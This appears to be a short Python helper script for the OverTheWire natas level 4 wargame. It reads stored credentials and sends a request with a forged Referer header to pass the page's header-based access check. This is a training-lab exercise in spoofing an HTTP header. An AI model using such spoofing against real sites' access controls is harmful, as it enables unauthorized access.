"""
Help script to resolve natas challenge #4
"""
import requests
import json

level = 'natas4'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
The page allows access based on the "Referer" header.
"""
response = requests.get(url, headers={'Referer': 'http://natas5.natas.labs.overthewire.org/'}, auth=auth)
print(response.text)
